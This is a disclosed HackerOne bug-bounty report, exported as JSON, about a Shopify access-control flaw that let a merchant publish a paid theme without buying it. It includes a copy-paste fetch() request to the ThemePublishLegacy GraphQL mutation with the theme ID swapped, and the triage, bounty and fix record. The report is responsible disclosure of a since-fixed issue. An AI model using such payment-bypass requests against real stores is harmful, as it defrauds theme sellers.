{"id":927567,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85Mjc1Njc=","url":"https://hackerone.com/reports/927567","title":"Ability to publish a paid theme without purchasing it.","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-07-20T01:59:42.448Z","submitted_at":"2020-07-20T01:59:42.448Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"saltymermaid","url":"/saltymermaid","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/J6WqYLP9spicHRpcvFf3vqWm/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-27T19:41:33.735Z","bug_reporter_agreed_on_going_public_at":"2020-08-27T19:41:33.667Z","team_member_agreed_on_going_public_at":"2020-08-25T21:33:41.164Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\n## Description\nI found out that it is possible to publish a paid theme without purchasing it. I remember trying this some time ago and it seemed to be safe from this kind of attack.\n\n## Steps to reproduce\n1. Make sure you have the default theme installed and that it is published.\n2. Install any *free* theme\n3. Install any *paid* theme\n4. Get the paid theme ID by clicking the \"Customize\" link and extract the ID from the url (https\\://yourshop.myshopify.com/admin/themes/***[theme_id]***/editor) and save it for later.\n5. Publish the free theme you install from step #2\n6. From your developper tool, copy the \"*ThemePublishLegacy*\" XHR request as Fetch\\\n\n    ```\n    fetch(\"https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql\", {\n      \"headers\": {\n        \"accept\": \"application/json\",\n        \"accept-language\": \"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\",\n        \"cache-control\": \"no-cache\",\n        \"content-type\": \"application/json\",\n        \"pragma\": \"no-cache\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-origin\",\n        \"x-online-store-web\": \"1\"\n      },\n      \"referrerPolicy\": \"no-referrer\",\n      \"body\": \"{\\\"operationName\\\":\\\"ThemePublishLegacy\\\",\\\"variables\\\":{\\\"id\\\":\\\"gid://shopify/OnlineStoreTheme/[THEME_ID]\\\"},\\\"query\\\":\\\"mutation     ThemePublishLegacy($id: ID!) {\\\\n  onlineStoreThemePublish(id: $id) {\\\\n    theme {\\\\n      id\\\\n      __typename\\\\n    }\\\\n    userErrors {\\\\n      field\\\\n          message\\\\n      __typename\\\\n    }\\\\n    __typename\\\\n  }\\\\n}\\\\n\\\"}\",\n      \"method\": \"POST\",\n      \"mode\": \"cors\",\n      \"credentials\": \"include\"\n    });\n```\n7. Paste the request in your developer tool console and replace the free theme ID with the paid theme ID you save at step #4\n 7.1. `...\"body\": \"{\\\"operationName\\\":\\\"ThemePublishLegacy\\\",\\\"variables\\\":{\\\"id\\\":\\\"gid://shopify/OnlineStoreTheme/`**`[THEME_ID]`**`\\\"},\\\"query\\\":\\\"mutation...`\n8. Refresh the page and you should see that the paid theme is now publish \u0026 active.\n\nAlso, after the theme is published, it seems like we own it. So, at this point, if you publish another theme (the free one), you should see that the the yellow \"Theme trial\"  badge is missing and that you can rename, edit and download the theme files.\n\n## Impact\n\nAbility to install paid theme without purchasing it could lead to content stealing and lost of profit. There is also some unwanted information disclosure since we can edit the theme code and download the files after its published.\n\nIf you need extra details, images or a POC video, please let me know!\n\nThank you!","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":15,"voters":["drsniper","th4nu_0x0","ali","realtess","h13-","sa1tama0","klau5","leskander","no-man-name","xcvii","and 5 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8685078,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @saltymermaid \n\nThank you for your report! We were able to reproduce the issue and our engineering team is working on a fix.\n\nCheers.","automated_response":false,"created_at":"2020-07-22T14:16:00.836Z","updated_at":"2020-07-22T14:16:00.836Z","actor":{"username":"alex_richter","cleared":false,"url":"/alex_richter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8685165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, thank you!","automated_response":false,"created_at":"2020-07-22T14:22:43.215Z","updated_at":"2020-07-22T14:22:43.215Z","actor":{"username":"saltymermaid","cleared":false,"url":"/saltymermaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J6WqYLP9spicHRpcvFf3vqWm/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8703178,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report! We're awarding a $2,000 bounty for this issue. We chose to award more than our minimum bounty because it allowed for a bypass of our usual theme payment flow.\n\nWe'll be in touch again once a fix is in place.","automated_response":false,"created_at":"2020-07-22T22:56:13.536Z","updated_at":"2020-07-22T22:56:13.536Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"saltymermaid","url":"/saltymermaid"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8703580,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, thank you!","automated_response":false,"created_at":"2020-07-22T23:05:07.431Z","updated_at":"2020-07-22T23:05:07.431Z","actor":{"username":"saltymermaid","cleared":false,"url":"/saltymermaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J6WqYLP9spicHRpcvFf3vqWm/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8721492,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-07-23T13:29:11.879Z","updated_at":"2020-07-23T13:29:11.879Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":795585},"actor":{"username":"alex_richter","cleared":false,"url":"/alex_richter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8722216,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @saltymermaid.\n\nWe recently addressed this issue by disallowing the publishing of demo themes by all API users, and allowing all API users to edit demo themes. \n\nFor the above reason, we'll close this as resolved.\n\nCheers and thanks for making Shopify more secure!","automated_response":false,"created_at":"2020-07-23T14:18:48.610Z","updated_at":"2020-07-23T14:18:48.610Z","actor":{"username":"alex_richter","cleared":false,"url":"/alex_richter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"saltymermaid","url":"/saltymermaid"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8725235,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @alex_richter,\n\nI retested and everything seems to be fixed correctly. However, I want to mention that I am still able to rename paid themes using the same method (OnlineStoreThemeUpdatePayload). I understand that this probably doesn't involve any security issues, but I thought it was relevant to let you know as this option is normally only available for free themes.\n\nThanks!","automated_response":false,"created_at":"2020-07-23T17:07:38.824Z","updated_at":"2020-07-23T17:07:38.824Z","actor":{"username":"saltymermaid","cleared":false,"url":"/saltymermaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J6WqYLP9spicHRpcvFf3vqWm/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9038677,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-25T21:33:41.182Z","updated_at":"2020-08-25T21:33:41.182Z","first_to_agree":true,"actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9059926,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-08-27T19:41:33.700Z","updated_at":"2020-08-27T19:41:33.700Z","actor":{"username":"saltymermaid","cleared":false,"url":"/saltymermaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J6WqYLP9spicHRpcvFf3vqWm/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9059927,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-27T19:41:33.771Z","updated_at":"2020-08-27T19:41:33.771Z","actor":{"username":"saltymermaid","cleared":false,"url":"/saltymermaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/J6WqYLP9spicHRpcvFf3vqWm/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}